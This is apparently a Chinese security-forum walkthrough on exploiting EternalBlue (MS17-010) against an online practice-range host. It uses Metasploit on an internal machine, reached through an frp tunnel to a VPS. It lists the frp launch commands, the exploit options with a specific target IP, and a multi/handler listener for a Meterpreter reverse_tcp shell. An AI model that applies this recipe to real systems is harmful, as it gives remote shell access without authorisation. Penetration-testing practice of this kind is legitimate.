![image-20220811151438363](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-d372c4ccffac811b6a04d419f118930e5d864a7b.png)

看我用内网MSF打公网永恒之蓝
===============

> 存在疑问，网查没有，技术一般，重在思路，不喜勿喷
> 
> 正常用msf打永恒之蓝漏洞的过程复现在网上一翻一大堆，不过基本上都是内网的两个虚拟机互打，然后之前我就冒出来个稀奇古怪的想法，假如这台带有永恒之蓝漏洞的服务器在公网上呢，我又不想在公网上装msf，怎么才能用内网msf碰到外网的漏洞呢？下面是我利用内网msf打公网的永恒之蓝的过程。

0x01 frp搭建
==========

首先需要frp搭建隧道，将本地的4444端口，映射到公网VPS的30001端口上，VPS和本地分别下载frp按照如下配置

**本地设置frpc.ini**

![image-20220807134036575](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-65b135eceb56c9e2d38fd96f489c13ec57d8c41a.png)

- `server_port`是公网为了和内网建立frp隧道的端口
- `remote_port`在这里代表要将本地4444端口映射到公网的30001端口上
- `local_ip`注意要写内网IP不要写本地回环地址（127.0.0.1）

**VPS设置frps.ini**

![image-20220807135639843](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-9c12d1bdfc4c15884da8e42ebea29e6f0f5211ed.png)

frps.ini文件配置相对简单些，token对应上就行

- - - - - -

然后本地和VPS分别启动frp

本地
==

./frpc -c ./frpc.ini

VPS
===

./frps -c ./frps.ini

开启后我们访问公网的30001端口就会直接穿到本地的4444上，例如我在本地用python开个http服务

![image-20220807135941343](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-71a78458eaad0ca8b24b5c0b3721e941fd24cf1a.png)

访问公网的30001

![image-20220807140017031](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-3cbf031ed71b903e97dcf2392f3c09acc9fd11dd.png)

至此frp配置完成

- - - - - -

0x02 攻击公网永恒之蓝
=============

首先用在线靶场开个靶机

![image-20220807140304778](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-f19475006dcf275cdaee9c671b97b9a2ff438aff.png)

之后打开msf并加载`msf17-010`攻击载荷

![image-20220807140513506](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8226946a4cd27b6d12ffa27fefe2cc5cf8af52ed.png)

注意这个载荷默认的payload是`windows/x64/meterpreter/reverse_tcp`这个后续要用到，然后设置配置项

options  
​  
set rhosts 52.81.73.86  
​  
set lhosts VPS地址  
​  
set lport 30001

这个时候先不要run，这里执行攻击是可以不过我们设置的回连地址是VPS地址，端口是frp的那个端口，也就是代表它会穿到内网的4444端口来，但是当我们run时除了执行攻击载荷外，它还有一步就是根据设置的回连的地址和端口监听，也就是在本地监听公网所以自然监听不到，但是如果我们设置监听本地地址确实能监听到，但是回弹shell却弹不回来，这里就很难搞

这时候我们需要在启动一个msf，并且根据上面的默认payload设置本地监听

use exploit/multi/handler  
​  
set payload windows/x64/meterpreter/reverse\_tcp  
​  
set lhost eth0  
​  
run

监听跑起来后再执行ms17-010攻击载荷，结果如下

![image-20220807141805816](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-05afcf08c3b7a2804b5292f3df2062cb9eccddbc.png)

左边的攻击载荷反弹不回来session在预料之中，右边的监听成功接收到session

- - - - - -

技术点没多难，只不过把我自己这个思路记录一下